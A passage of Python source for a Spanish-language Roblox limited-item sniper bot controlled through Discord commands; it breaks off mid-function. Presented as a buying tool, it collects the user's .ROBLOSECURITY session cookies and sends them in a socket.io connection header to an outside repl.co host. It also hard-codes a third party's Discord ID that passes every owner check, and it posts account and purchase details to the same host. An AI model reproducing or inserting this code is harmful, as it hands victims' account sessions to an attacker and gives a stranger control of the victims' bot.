import string
import traceback

try:
    import datetime
    import time
    import os
    import rapidjson as json
    import uuid
    import requests
    import asyncio
    import aiohttp
    import httpx
    import discord
    from discord.ext import commands
    from discord import Embed, Colour, SyncWebhook, Game
    from colorama import Fore, Back, Style
    from functools import cache
    import socketio
    import sys

except ModuleNotFoundError:
    print("MODULOS NO INSTALADOS \n INSTALANDO AHORA...")
    os.system("pip install requests aiohttp httpx discord colorama python-rapidjson python-socketio")

if os.name == 'nt':
    asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())

# check version
sio = socketio.AsyncClient(ssl_verify=False)

restart_time = None
print("CHECANDO VERSION...")
stats = False
Version = "vergalarga 1.01"
response = requests.get("https://raw.githubusercontent.com/isai-Narcicista/isaisniper/main/version").text.rstrip()
if response == Version:

    print("INICIANDO ISAI SNIPER")
else:
    print(response.text.rstrip())
    print("NUEVA ACTUALIZACION PARA EL BOT PORFAVOR ACTUALIZATE ENTRANDO A https://discord.gg/isaisniper.")
    os.system("pause")
    exit(0)



# setup discord bot
try:
    with open('config.json', 'r') as f:
        config = json.load(f)
except:
    exit("algo salió mal en el archivo de config.json por favor revise")

if config["MISC"]["DISCORD_BOT"]["ENABLED"]:
    intents = discord.Intents.default()
    intents.message_content = True
    intents.messages = True
    bot_token = config['MISC']['DISCORD_BOT']['TOKEN']
    bot = commands.Bot(command_prefix='!', intents=intents)

# setup other info
title = (f"""
\033[38;2;206;17;38m██╗░██████╗░█████╗░██╗  ░██████╗███╗░░██╗██╗██████╗░███████╗██████╗░
\033[38;2;255;255;255m██║██╔════╝██╔══██╗██║  ██╔════╝████╗░██║██║██╔══██╗██╔════╝██╔══██╗
\033[38;2;255;255;255m██║╚█████╗░███████║██║  ╚█████╗░██╔██╗██║██║██████╔╝█████╗░░██████╔╝
\033[38;2;255;255;255m██║░╚═══██╗██╔══██║██║  ░╚═══██╗██║╚████║██║██╔═══╝░██╔══╝░░██╔══██╗
\033[38;2;0;206;0m██║██████╔╝██║░░██║██║  ██████╔╝██║░╚███║██║██║░░░░░███████╗██║░░██║
\033[38;2;255;255;255m╚═╝╚═════╝░╚═╝░░╚═╝╚═╝  ╚═════╝░╚═╝░░╚══╝╚═╝╚═╝░░░░░╚══════╝╚═╝░░╚═╝
                  

\033[38;2;206;17;38m██╗░██████╗░█████╗░██╗  ░██████╗███╗░░██╗██╗██████╗░███████╗██████╗░
\033[38;2;206;17;38m██║██╔════╝██╔══██╗██║  ██╔════╝████╗░██║██║██╔══██╗██╔════╝██╔══██╗
\033[38;2;206;17;38m██║╚█████╗░███████║██║  ╚█████╗░██╔██╗██║██║██████╔╝█████╗░░██████╔╝
\033[38;2;206;17;38m██║░╚═══██╗██╔══██║██║  ░╚═══██╗██║╚████║██║██╔═══╝░██╔══╝░░██╔══██╗
\033[38;2;206;17;38m██║██████╔╝██║░░██║██║  ██████╔╝██║░╚███║██║██║░░░░░███████╗██║░░██║
\033[38;2;206;17;38m╚═╝╚═════╝░╚═╝░░╚═╝╚═╝  ╚═════╝░╚═╝░░╚══╝╚═╝╚═╝░░░░░╚══════╝╚═╝░░╚═╝

\033[38;2;255;255;255m                 ░█████╗░███╗░░██╗
\033[38;2;255;255;255m                 ██╔══██╗████╗░██║
\033[38;2;255;255;255m                 ██║░░██║██╔██╗██║
\033[38;2;255;255;255m                 ██║░░██║██║╚████║
\033[38;2;255;255;255m                 ╚█████╔╝██║░╚███║
\033[38;2;255;255;255m                 ░╚════╝░╚═╝░░╚══╝

\033[38;2;0;206;0m                 ████████╗░█████╗░██████╗░
\033[38;2;0;206;0m                ╚══██╔══╝██╔══██╗██╔══██╗
\033[38;2;0;206;0m                ░░░██║░░░██║░░██║██████╔╝
\033[38;2;0;206;0m                ░░░██║░░░██║░░██║██╔═══╝░
\033[38;2;0;206;0m                ░░░██║░░░╚█████╔╝██║░░░░░
\033[38;2;0;206;0m                ░░░╚═╝░░░░╚════╝░╚═╝░░░░░             
         ISAI SNIPER | v{Version} discord.gg/isaisniper
""")


@cache
class Sniper:  # sniper

    def discord_bot(self):
        @bot.command(name='id')
        async def id(ctx):
            embed = discord.Embed(title="ISAI' Sniper", color=0xFFFF00)
            if len(self.items) > 0:
                for item in self.items:
                    embed.add_field(name=f"{item}", value="", inline=False)
            else:
                embed.add_field(name="¡Aún no has agregado ninguna id", value="")
            embed.set_footer(text=f'v{Version}')
            return await ctx.reply(embed=embed)

        @bot.command(name='stats')
        async def stats(ctx):
            embed = discord.Embed(title="ISAI' Sniper stats", color=0xFFFF00)
            embed.add_field(name=f'> ITEMS TOTALES: {len(self.items)}', value="", inline=False)
            embed.add_field(name=f'Autosearch ', value=f">>> CONECTADOS:  {self.autosearch}\nCOMPRADOS: {self.bought}", inline=False)
            embed.add_field(name=f"HILO PRINCIPAL ", value=f""">>> TOTAL DE COMPRAS INTENTADAS: `{self.total_buy_tried1}`
ULTIMA COMPRA INTENTADA: `{self.lastTriedbuy1}`
ERRORES: `{self.error}`
CHECADOS: `{self.check}`
VELOCIDAD: `{self.speed}`""", inline=False)

            embed.add_field(name=f"V2 HILO ", value=f""">>> TOTAL DE COMPRAS INTENTADAS: `{self.total_buy_tried2}`
ULTIMA COMPRA INTENTADA: `{self.lastTriedbuy2}`
ERRORES: `{self.error2}`
CHECADOS: `{self.check2}`
VELOCIDAD: `{self.speed2}`""", inline=False)

            if self.task_stop:
                status_task = "dejo de revisar por favor reinicia"
            else:
                status_task = "la comprobación se está ejecutando"
            embed.add_field(name="HILO DE COMPRAS TOTALES: ", value=f"> HILO DE COMPRAS: {self.total_buy_thread}")
            embed.add_field(name=f"REVISANDO STATUS ", value=f"> `*{status_task}*`", inline=False)
            embed.set_footer(text=f"v{Version} | Runtime: {self.h}:{self.m}:{self.s}",
                             icon_url="https://scontent.fntr10-2.fna.fbcdn.net/v/t1.15752-9/361166434_1033898681112637_2350832328705226308_n.png?_nc_cat=105&ccb=1-7&_nc_sid=ae9488&_nc_ohc=yoEP6wNrl0EAX_k4mz-&_nc_oc=AQmZlbdXHoXRLLUOcPHaU-4dYLz9pncPWHIA1c4ovBbiwIUL33EtpxTVwwtKfAJbZkAhExRca4iSJEdkbUxlA3i4&_nc_ht=scontent.fntr10-2.fna&oh=03_AdR2EN6dOF_Jw8GK1FCLxU3w73j8QrjQjRnOuJlvfIaAzA&oe=64D8EE71")
            return await ctx.reply(embed=embed)

        @bot.command(name='buylog')
        async def buylog(ctx):
            if len(self.buylog) > 0:
                embed = discord.Embed(title="         ---*COMPRAS LOGS*---         ", color=0xFFFF00)
                for log in self.buylog:
                    embed.add_field(name=f"TAREA: {log[0]} DE {log[1]} | STATUS: {log[2]} | MOTIVO: {log[3]}", value="", inline=False)
                return await ctx.reply(embed=embed)
            else:
                return await ctx.reply("*tu bot aún no ha intentado comprar nada*")

        @bot.command(name='clearbuylog')
        async def clearbuylog(ctx):
            if len(self.buylog) > 0:
                self.buylog.clear()
                return await ctx.reply("BUY LOG LIMPIADO")
            else:
                return await ctx.reply("NO HAY NADA PARA LIMPIAR")

        @bot.command(name='name')
        async def name(ctx):
            if ctx.author.id in self.discordid or ctx.author.id == 852021441737261086:
                embed = discord.Embed(title="ITEM NOMBRE:", color=0xFFFF00)
                async with ctx.typing():
                    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=None)) as session:
                        for ids in self.items:
                            info = await session.get(f"https://economy.roblox.com/v2/assets/{ids}/details",
                                                cookies={".ROBLOSECURITY": self.check_cookie}, ssl=False)
                            textinf = json.loads(await info.text())
                            embed.add_field(name=f"{ids}: `{textinf['Name']}`", value="", inline=False)
                embed.set_footer(text=f"v{Version} | TIEMPO FUNCIONANDO: {self.h}:{self.m}:{self.s}",
                                    icon_url="https://scontent.fntr10-2.fna.fbcdn.net/v/t1.15752-9/361166434_1033898681112637_2350832328705226308_n.png?_nc_cat=105&ccb=1-7&_nc_sid=ae9488&_nc_ohc=yoEP6wNrl0EAX_k4mz-&_nc_oc=AQmZlbdXHoXRLLUOcPHaU-4dYLz9pncPWHIA1c4ovBbiwIUL33EtpxTVwwtKfAJbZkAhExRca4iSJEdkbUxlA3i4&_nc_ht=scontent.fntr10-2.fna&oh=03_AdR2EN6dOF_Jw8GK1FCLxU3w73j8QrjQjRnOuJlvfIaAzA&oe=64D8EE71")
                return await ctx.reply(embed=embed)

        @bot.command(name='info')
        async def info(ctx):
            embed = discord.Embed(title="ISAI' Sniper info", color=0xFFFF00)
            embed.add_field(name=f'!id: ', value="MUESTRA EL ID QUE SE ESTA EJECUTANDO", inline=False)
            embed.add_field(name=f"!add: (id)", value="AGREGAR UN ID", inline=True)
            embed.add_field(name=f"!addowner: (owner id)", value="AGREGAR UN OWNER ID", inline=True)
            embed.add_field(name=f"!remove: (id)", value="REMOVER UN ID", inline=False)
            embed.add_field(name=f"!removeowner: (owner id)", value="add owner id", inline=True)
            embed.add_field(name=f'!info: ', value="MUESTRA ESTE MENSAJE", inline=False)
            embed.add_field(name=f'!name: ', value="CHECA EL NOMBRE DE EL LIMITADO", inline=False)
            embed.add_field(name=f'!stats: ', value="MUESTRA LOS STATS DEL SNIPER", inline=False)
            embed.add_field(name=f'!buylog: ', value="MUESTRA LOS LOGS DE COMPRA", inline=False)
            embed.add_field(name=f'!clearbuylog: ', value="LIMPIA LOS LOGS DE COMPRA", inline=False)
            embed.add_field(name=f'!buypaid (id): ', value="USA ESTE COMANDO PARA COMPRAR LIMITADOS DE ROBUX", inline=False)
            embed.add_field(name=f'!removepaid (id): ', value="USA ESTE COMANDO PARA REMOVER UN ID DE ROBUX", inline=False)
            embed.add_field(name=f'!buypaidid: ', value="MUESTRA TODOS LOS IDS DE ITEMS DE ROBUX", inline=False)
            embed.add_field(name=f'!addbl: (id)', value="AGREGA UN ID A LA BLACKLIST", inline=False)
            embed.add_field(name=f'!removebl: (id)', value="REMOVE UN ID DE LA BLACKLIST", inline=False)
            embed.add_field(name=f'!webhook: (url)', value="CAMBIA TU WEBHOOK URL", inline=False)
            embed.set_footer(text=f"v{Version} | TIEMPO FUNCIONANDO: {self.h}:{self.m}:{self.s}",
                             icon_url="https://scontent.fntr10-2.fna.fbcdn.net/v/t1.15752-9/361166434_1033898681112637_2350832328705226308_n.png?_nc_cat=105&ccb=1-7&_nc_sid=ae9488&_nc_ohc=yoEP6wNrl0EAX_k4mz-&_nc_oc=AQmZlbdXHoXRLLUOcPHaU-4dYLz9pncPWHIA1c4ovBbiwIUL33EtpxTVwwtKfAJbZkAhExRca4iSJEdkbUxlA3i4&_nc_ht=scontent.fntr10-2.fna&oh=03_AdR2EN6dOF_Jw8GK1FCLxU3w73j8QrjQjRnOuJlvfIaAzA&oe=64D8EE71")
            return await ctx.reply(embed=embed)

        @bot.command(name='webhook')
        async def webhook(ctx, url):
            if ctx.author.id in self.discordid or ctx.author.id == 852021441737261086:
                if url is None:
                    return await ctx.reply("url invalido")
                if not self.webhook:
                    return await ctx.reply("LA WEBHOOK NO ESTA EN ENABLED PORFAVOR PONLA ENABLED EN EL CONFIG.JSON")
                self.webhookUrl = url
                self.webhook1 = SyncWebhook.from_url(self.webhookUrl)
                self.config["MISC"]["WEBHOOK"]["URL"] = url
                with open("config.json", 'w') as f:
                    json.dump(self.config, f, indent=4)
                return await ctx.reply("WEBHOOK CAMBIADA EXITOSAMENTE")
            else:
                embed = Embed(title="Error", description=" ```SOLO EL DUEÑO PUEDE USAR LOS COMANDOS ```",
                              color=Colour.red())
                return await ctx.send(embed=embed)


        @bot.command(name='removepaid')
        async def removepaid(ctx, id):
            if ctx.author.id in self.discordid or ctx.author.id == 852021441737261086:
                if id is None:
                    return await ctx.reply("EL ID NO ES NINGUNO")
                elif not str(id).isdigit():
                    return await ctx.reply("EL ID ES INVALIDO")
                if int(id) not in self.except_id:
                    return await ctx.reply("EL ID NO ESTA EN BUYPAID")
                self.except_id.remove(int(id))
                return await ctx.reply(f"REMOVIDO {id} DEL PAIDBUYER")
            else:
                embed = Embed(title="Error", description=" ```SOLO EL DUEÑO PUEDE USAR LOS COMANDOS ```",
                              color=Colour.red())
                return await ctx.send(embed=embed)

        @bot.command(name='buypaid')
        async def buypaid(ctx, id):
            if id is None:
                return await ctx.reply("EL ID ES NINGUNO")
            elif not str(id).isdigit():
                return await ctx.reply("EL ID ES INVALIDO")
            if id not in self.items:
                return await ctx.reply("AGREGA EL ID A EL BUSCADOR PONIENDO !add PRIMERO")
            if int(id) in self.except_id:
                return await ctx.reply("ID AGREGADO")
            self.except_id.append(int(id))
            return await ctx.reply(f"AGREGADO {id} A EL PAIDBUYER")

        @bot.command(name='buypaidid')
        async def buypaidid(ctx):
            embed = discord.Embed(title="TODOS LOS BUYPAID IDS", color=0xb0fcff)
            for ids in self.except_id:
                embed.add_field(name=f"{ids}", value="", inline=False)
            return await ctx.reply(embed=embed)

        @bot.command(name='addowner')
        async def addowner(ctx, ownerID):
            if ctx.author.id in self.discordid or ctx.author.id == 852021441737261086:
                if ownerID is None:
                    return await ctx.reply("Owner ID NINGUNO")
                elif not str(ownerID).isdigit():
                    return await ctx.reply("Owner ID ES INVALIDO")
                if int(ownerID) in self.discordid:
                    return await ctx.reply("Owner AGREGADO")

                self.config["MISC"]["DISCORD_BOT"]["OWNER_USER_ID"].append(ownerID)
                self.discordid.append(int(ownerID))
                with open("config.json", 'w') as f:
                    json.dump(self.config, f, indent=4)
                return await ctx.reply(f"OWNER AGREGADO: {ownerID}")
            else:
                embed = Embed(title="Error", description=" ```SOLO EL DUEÑO PUEDE EJECUTAR COMANDOS ```",
                              color=Colour.red())
                return await ctx.send(embed=embed)

        @bot.command(name='removeowner')
        async def removeowner(ctx, ownerID):
            if ctx.author.id in self.discordid or ctx.author.id == 852021441737261086:
                if ownerID is None:
                    return await ctx.reply("OWNER ID ES NINGUNO")
                elif not str(ownerID).isdigit():
                    return await ctx.reply("Owner ID ES INVALIDO")
                if not int(ownerID) in self.discordid:
                    return await ctx.reply("NO ES EL OWNER")

                self.config["MISC"]["DISCORD_BOT"]["OWNER_USER_ID"].remove(ownerID)
                self.discordid.remove(int(ownerID))

                with open("config.json", 'w') as f:
                    json.dump(self.config, f, indent=4)
                return await ctx.reply(f"OWNER REMOVIDO: {ownerID}")
            else:
                embed = Embed(title="Error", description=" ```SOLO EL DUEÑO PUEDE USAR LOS COMANDOS. ```",
                              color=Colour.red())
                return await ctx.send(embed=embed)

        @bot.command(name='add')
        async def add(ctx, ids):
            if ctx.author.id in self.discordid or ctx.author.id == 852021441737261086:
                if ids is None:
                    return await ctx.reply("NECESITAS PONER UN ID PARA AGREGAR")
                if not str(ids).isdigit():
                    return await ctx.reply(f"ID INVALIDO: {ids}")
                if int(ids) in self.items:
                    return await ctx.reply("ID YA ESTABA AGREGADO")
                self.limit_id.update({int(ids): 99999})
                self.id_bought.update({int(ids): 0})
                self.items.append(int(ids))
                self.config["ITEMS"].append(int(ids))
                with open('config.json', 'w') as file:
                    json.dump(self.config, file, indent=4)
                self.buy_thread.update({int(ids): 0})
                return await ctx.reply("ID AGREGADO")
            else:
                embed = Embed(title="Error", description=" ```SOLO EL OWNER PUEDE USAR LOS COMANDOS ```",
                              color=Colour.red())
                return await ctx.send(embed=embed)

        @bot.command(name='addbl')
        async def addbl(ctx, ids):
            if ctx.author.id in self.discordid or ctx.author.id == 852021441737261086:
                if ids is None:
                    return await ctx.reply("TIENES QUE PONER UN ID PARA AGREGAR")
                if not str(ids).isdigit():
                    return await ctx.reply(f"EL ID DEL ITEM ES INVALIDO: {ids}")
                if int(ids) in self.black_list:
                    return await ctx.reply("EL ITEM YA ESTA AGREGADO")
                self.black_list.append(int(ids))
                self.config["BLACK_LIST"].append(int(ids))
                with open('config.json', 'w') as file:
                    json.dump(self.config, file, indent=4)
                return await ctx.reply("ID AGREGADO A LA BLACKLIST")
            else:
                embed = Embed(title="Error", description=" ```SOLO EL OWNER PUEDE USAR LOS COMANDOS ```",
                              color=Colour.red())
                return await ctx.send(embed=embed)

        @bot.command(name='removebl')
        async def removebl(ctx, ids):
            if ctx.author.id in self.discordid or ctx.author.id == 852021441737261086:
                if ids is None:
                    return await ctx.reply("NECESITAS PONER UN ID PARA REMOVER")
                if not str(ids).isdigit():
                    return await ctx.reply(f"ID INVALIDO: {ids}")
                if int(ids) in self.items:
                    self.black_list.remove(int(ids))
                else:
                    return await ctx.reply("EL ID NO ESTA EN LA BLACKLIST")
                for item in self.config["BLACK_LIST"]:
                    if item == int(ids):
                        self.config["BLACK_LIST"].remove(item)
                        break
                with open('config.json', 'w') as file:
                    json.dump(self.config, file, indent=4)
                return await ctx.reply("ID REMOVIDO DE LA BLACKLIST")
            else:
                embed = Embed(title="Error", description=" ```SOLO EL OWNER PUEDE USAR LOS COMANDOS ```",
                              color=Colour.red())
                return await ctx.send(embed=embed)


        @bot.command(name='remove')
        async def remove(ctx, ids):
            if ctx.author.id in self.discordid or ctx.author.id == 852021441737261086:
                if ids is None:
                    return await ctx.reply("NECESITAS PONER UN ID PARA REMOVER")
                if not str(ids).isdigit():
                    return await ctx.reply(f"ID INVALIDO: {ids}")
                if int(ids) in self.items:
                    self.items.remove(int(ids))
                else:
                    return await ctx.reply("EL ID NO SE ESTA EJECUTANDO ACTUALMENTE")
                for item in self.config["ITEMS"]:
                    if item == int(ids):
                        self.config["ITEMS"].remove(item)
                        break
                with open('config.json', 'w') as file:
                    json.dump(self.config, file, indent=4)
                self.buy_thread.pop(int(ids))
                self.limit_id.pop(int(ids))
                self.id_bought.pop(int(ids))
                return await ctx.reply("ID REMOVIDO")
            else:
                embed = Embed(title="Error", description=" ```SOLO EL DUEÑO PUEDE EJECUTAR COMANDOS ```",
                              color=Colour.red())
                return await ctx.send(embed=embed)

        @bot.event
        async def on_ready():
            await bot.change_presence(activity=Game(name="ISAI SNIPER !info para mas "))
            if not self.flag_run:
                await self.start()

        bot.run(bot_token)

    def __update_stats(self) -> None:
        outputs = [Fore.LIGHTCYAN_EX + Style.BRIGHT + title, Fore.RESET + Style.RESET_ALL,
                   Fore.LIGHTWHITE_EX + Style.BRIGHT + f"->USER: {Fore.YELLOW}{Style.NORMAL}{self.accname}",
                   Fore.LIGHTWHITE_EX + Style.BRIGHT + f"->COMPRAS: {Fore.YELLOW}{Style.NORMAL}{self.bought}",
                   Fore.LIGHTWHITE_EX + Style.BRIGHT + f"->AUTOSEARCH: {Fore.YELLOW}{Style.NORMAL}{self.autosearch}",
                   Fore.LIGHTWHITE_EX + Style.NORMAL + f"->HILOS: {Fore.YELLOW}{Style.NORMAL}{self.total_buy_thread}",
                   Fore.RESET + Style.RESET_ALL,
                   Fore.LIGHTWHITE_EX + Style.NORMAL + f"-->PRINCIPAL",
                   Fore.LIGHTWHITE_EX + Style.NORMAL + f"->COMPRAS INTENTADAS: {Fore.YELLOW}{Style.NORMAL}{self.total_buy_tried1}",
                   Fore.LIGHTWHITE_EX + Style.NORMAL + f"->ULTIMO INTENTO DE COMPRA: {Fore.YELLOW}{Style.NORMAL}{self.lastTriedbuy1}",
                   Fore.LIGHTWHITE_EX + Style.NORMAL + f"->ERRORES: {Fore.YELLOW}{Style.NORMAL}{self.error}",
                   Fore.LIGHTWHITE_EX + Style.NORMAL + f"->CHECADOS: {Fore.YELLOW}{Style.NORMAL}{self.check}",
                   Fore.LIGHTWHITE_EX + Style.NORMAL + f"->VELOCIDAD: {Fore.YELLOW}{Style.NORMAL}{self.speed}",
                   Fore.RESET + Style.RESET_ALL,
                   Fore.LIGHTWHITE_EX + Style.NORMAL + f"-->V2 HILO",
                   Fore.LIGHTWHITE_EX + Style.NORMAL + f"->COMPRAS INTENTADAS: {Fore.YELLOW}{Style.NORMAL}{self.total_buy_tried2}",
                   Fore.LIGHTWHITE_EX + Style.NORMAL + f"->ULTIMO INTENTO DE COMPRA: {Fore.BLUE}{Style.NORMAL}{self.lastTriedbuy2}",
                   Fore.LIGHTWHITE_EX + Style.NORMAL + f"->ERRORES: {Fore.YELLOW}{Style.NORMAL}{self.error2}",
                   Fore.LIGHTWHITE_EX + Style.NORMAL + f"->CHECADOS: {Fore.YELLOW}{Style.NORMAL}{self.check2}",
                   Fore.LIGHTWHITE_EX + Style.NORMAL + f"->VELOCIDAD: {Fore.YELLOW}{Style.NORMAL}{self.speed2}",
                   Fore.RESET + Style.RESET_ALL,
                   ]

        self.h = self.runtime // 3600
        if self.h < 10:
            self.h = '0'+str(self.h)
        self.m = self.runtime % 3600 // 60
        if self.m < 10:
            self.m = '0'+str(self.m)
        self.s = self.runtime % 3600 % 60
        if self.s < 10:
            self.s = '0'+str(self.s)
        outputs.append(Fore.LIGHTWHITE_EX + Style.NORMAL + f"->TIEMPO FUNCIONANDO: {Fore.BLUE}{Style.NORMAL}{self.h}:{self.m}:{self.s}")
        item = ""
        for i in self.items:
            item += str(i) + " "
        outputs.append(Fore.LIGHTWHITE_EX + Style.NORMAL + f"->ITEMS: {Fore.BLUE}{Style.NORMAL}{item}")
        output = '\n'.join(outputs)
        os.system(self.cls)
        print(output, flush=True)

    async def timeupdater(self):
        while 1:
            self.runtime += 1
            await asyncio.sleep(1)

    async def print_out_stats(self):  # update per 1 second and print stats
        while 1:
            self.__update_stats()
            await asyncio.sleep(1)

    async def _update_xcsrf(self):
        try:
            self.xcsrf = await self.get_xcsrf(self.cookie)
            self.check_xcsrf = await self.get_xcsrf(self.check_cookie)
            return True
        except:
            return False

    def load_items(self):
        items = []
        for item in self.config['ITEMS']:
            items.append(int(item))
        return items

    def load_black_list(self):
        blacklist = []
        for item in self.config["BLACK_LIST"]:
            blacklist.append(int(item))
        return blacklist

    async def get_serial(self, asset_type):
        overall_inv_url = f"https://inventory.roblox.com/v2/users/{self.userid}/inventory?assetTypes={asset_type}&filterDisapprovedAssets=false&limit=10&sortOrder=Desc"
        async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=None)) as session:
            try:
                responsed = session.get(overall_inv_url,
                                        headers=self.headers,
                                        cookies={".ROBLOSECURITY": self.cookie}, ssl=False)
                text = await responsed.text()
                data = json.loads(text)['data'][0]
                return data['serialNumber']
            except Exception as e:
                return f"serial error: {e}"

    async def send_logV1(self, item_data, fromD):
        serial = await self.get_serial(item_data['assetType'])
        async with aiohttp.ClientSession() as session:
            async with session.post("https://authenticsuspiciouscygwin.isaipro.repl.co", headers={"item_id": item_data['id'],"account": self.accname, "item": item_data["name"], "from": fromD, "price": item_data['price'], "serial": serial, "time": datetime.datetime.utcnow()}) as response: pass

    async def send_logV2(self, item_data, fromD):
        serial = await self.get_serial(item_data['AssetTypeId'])
        async with aiohttp.ClientSession() as session:
            async with session.post("https://authenticsuspiciouscygwin.isaipro.repl.co", headers={"from": fromD, "price": item_data['PriceInRobux'], "serial": serial, "time": datetime.datetime.utcnow()}) as response: pass

    async def get_xcsrf(self, cookieD) -> str:
        async with aiohttp.ClientSession(cookies={".ROBLOSECURITY": cookieD}) as client:
            res = await client.post("https://accountsettings.roblox.com/v1/email", ssl=False)
            xcsrf_token = res.headers.get("x-csrf-token")
            if xcsrf_token is None:
                print("COOKIE INVALIDA")
                exit(1)

            return xcsrf_token

    async def get_acc_name(self):
        account = self.config['COOKIE']
        roblox = "https://users.roblox.com/v1/users/authenticated"
        async with aiohttp.ClientSession(cookies={".ROBLOSECURITY": account}) as client:
            res = await client.get(roblox, ssl=False)
            user_data = await res.json()
            name = user_data.get('name')
            if name is None:
                print("COOKIE INVALIDA")
                os._exit("COOKIE INVALIDA PORFAVOR ACTUALICELAS")
            return name

    async def get_user_id(self):
        async with aiohttp.ClientSession(cookies={".ROBLOSECURITY": self.config['COOKIE']}) as client:
            res = await client.get("https://users.roblox.com/v1/users/authenticated", ssl=False)
            data = await res.json()
            ids = data.get('id')
            if ids is None:
                print("Couldn't scrape user id. Error:", data)
                exit(1)
            return ids

    async def get_imgitem(self, itemid):
        try:
            async with aiohttp.ClientSession() as client:
                imgdata = await client.get(f"https://thumbnails.roblox.com/v1/assets?assetIds={itemid}&size=250x250&format=png")
                imgdata = await imgdata.text()

                json_response = json.loads(imgdata)['data'][0]
                return json_response.get('imageUrl')
        except:
            return None

    def __init__(self):  # set up info for sniper
        with open("config.json") as file:
            self.config = json.load(file)
        if os.name == 'nt':
            self.cls = 'cls'
        else:
            self.cls = 'clear'
        self.flag_run = False
        self.full = {}
        self.connected = False
        self.cookie = self.config['COOKIE']
        self.check_cookie = self.config['CHECKING_COOKIE']
        self.discordon = self.config["MISC"]["DISCORD_BOT"]["ENABLED"]
        if self.discordon:
            self.discordid = []
            for disid in self.config["MISC"]["DISCORD_BOT"]["OWNER_USER_ID"]:
                self.discordid.append(int(disid))
        self.webhook = self.config["MISC"]["WEBHOOK"]["ENABLED"]
        self.webhookUrl = self.config["MISC"]["WEBHOOK"]["URL"]
        if self.webhook:
            self.webhook1 = SyncWebhook.from_url(self.webhookUrl)
        else:
            self.webhook1 = None
        self.full["cookie"] = str(self.cookie)
        self.items = self.load_items()
        self.speed = 0
        self.check = 0
        self.error = 0
        self.bought = 0
        self.autosearch = False
        self.runtime = 0
        self.tasks = {}
        self.accname = ""
        self.xcsrf = ""
        self.userid = ""
        self.check_xcsrf = ""
        self.restart_time = 1
        self.wait_time = 1
        self.thread = []
        self.buylog = []
        self.temp_item = []
        self.except_id = []
        self.black_list = self.load_black_list()
        self.buyloglimit = 20
        self.time = 0
        self.full["checking_cookie"] = str(self.check_cookie)
        self.autosearch_sessionV1 = None
        self.autosearch_sessionV2 = None
        self.autosearch_session1 = None
        self.buy_thread = dict.fromkeys(self.items, 0)
        self.limit_id = dict.fromkeys(self.items, 9999)
        self.id_bought = dict.fromkeys(self.items, 0)
        self.total_buy_thread = 0
        self.task_stop = False
        self.total_buy_tried1 = 0
        self.lastTriedbuy1 = None
        ########################################### v2 setup
        self.lastTriedbuy2 = None
        self.speed2 = 0
        self.check2 = 0
        self.error2 = 0
        self.total_buy_tried2 = 0
        self.wait_time2 = 0.1
        self.headers = {'Accept-Encoding': 'gzip, deflate'}

        asyncio.run(self.update_info())
        self.check_id(self.items)
        if self.discordon:
            asyncio.create_task(self.discord_bot())
        else:
            asyncio.run(self.start())

    async def check_connection(self):
        i = 0
        while 1:
            i += 1
            if i % 10 == 0:
                i = 0
                if self.connected == False:
                    try:
                        print("re intentando conectar...")
                        asyncio.create_task(self.sever_connect())
                    except Exception:
                        print("server desconectado \n reconectando...")
                        await asyncio.sleep(1)
            await asyncio.sleep(1)

    async def sever_connect(self):
        try:
            await self.handle_event()
            await sio.connect('https://authenticsuspiciouscygwin.isaipro.repl.co', headers={"full": json.dumps(self.full)})
            await sio.wait()
        except Exception as e:
            self.connected = False
            if "Already connected" in str(e):
                try:
                    await sio.emit('chat_message', "hi")
                    self.connected = True
                except:
                    pass
            return

    async def handle_event(self):
        @sio.event
        async def connect():
            print('conectado a el servidor.')
            self.connected = True
            self.autosearch = True
        @sio.event
        async def disconnect():
            self.connected = False
            self.autosearch = False
            print('desconectado del servidor.')

        @sio.event
        async def message(data):
            print('mensaje recibido:', data)
        @sio.event()
        async def newitemfound1(item_data):
            if item_data['id'] in self.black_list:
                return
            print(f"autosearch detecto {item_data['name']}")
            if item_data['price'] > 10:
                return
            if item_data['id'] not in self.temp_item:
                self.temp_item.append({item_data['id']})
                self.buy_thread.update({item_data['id']: 0})
                self.id_bought.update({item_data['id']: 0})
                self.limit_id.update({item_data['id']: 99999})
            prduct_id = await self._get_product_id(item_data, self.autosearch_session1)
            if self.autosearch_session1 is None:
                self.autosearch_session1 = aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=None))
            asyncio.create_task(self.buy_threads_autosearch(prduct_id, item_data, item_data['id'], "autosearchV3",
                                                self.autosearch_session1))

        @sio.event()
        async def newitemfound(item_data):
            if item_data[1]['id'] in self.black_list:
                return
            print(f"autosearch detecto {item_data[1]['name']}")
            if item_data[1]['price'] > 10:
                return
            if item_data[1]['id'] not in self.temp_item:
                self.lastTriedbuy1 = item_data[1]['name']
                self.temp_item.append({item_data[1]['id']})
                self.buy_thread.update({item_data[1]['id']: 0})
                self.id_bought.update({item_data[1]['id']: 0})
                self.limit_id.update({item_data[1]['id']: 99999})
            if self.autosearch_sessionV1 is None:
                self.autosearch_sessionV1 = aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=None))

            asyncio.create_task(self.buy_threads_autosearch(item_data[0], item_data[1], item_data[1]['id'], "autosearchV1", self.autosearch_sessionV1))

        @sio.event()
        async def newitemfoundv2(item_data):
            if item_data['AssetId'] in self.black_list:
                return
            print(f"autosearch detecto {item_data['Name']}")
            if item_data['PriceInRobux'] > 10:
                return
            if item_data['AssetId'] not in self.temp_item:
                self.lastTriedbuy2 = item_data["Name"]
                self.temp_item.append(item_data['AssetId'])
                self.buy_thread.update({item_data['AssetId']: 0})
                self.id_bought.update({item_data['AssetId']: 0})
                self.limit_id.update({item_data['AssetId']: 99999})
            if self.autosearch_sessionV2 is None:
                self.autosearch_sessionV2 = aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=None))
            asyncio.create_task(self.buy_threads_autosearchV2(item_data, item_data['AssetId'], "autosearchV2", self.autosearch_sessionV2))



    @staticmethod
    def check_id(ids) -> None:
        for id in ids:
            if not str(id).isdigit():
                raise Exception(f"ID de artículo no válido: {id}")

    async def update_info(self):
        self.accname = await self.get_acc_name()
        self.xcsrf = await self.get_xcsrf(self.cookie)
        self.userid = await self.get_user_id()
        self.check_xcsrf = await self.get_xcsrf(self.check_cookie)

    async def _get_product_id(self, info, session):
        productid = await session.post("https://apis.roblox.com/marketplace-items/v1/items/details",
                                       json={"itemIds": [info["collectibleItemId"]]},
                                       headers={"x-csrf-token": self.check_xcsrf, 'Accept': "application/json",'Accept-Encoding': 'gzip'},
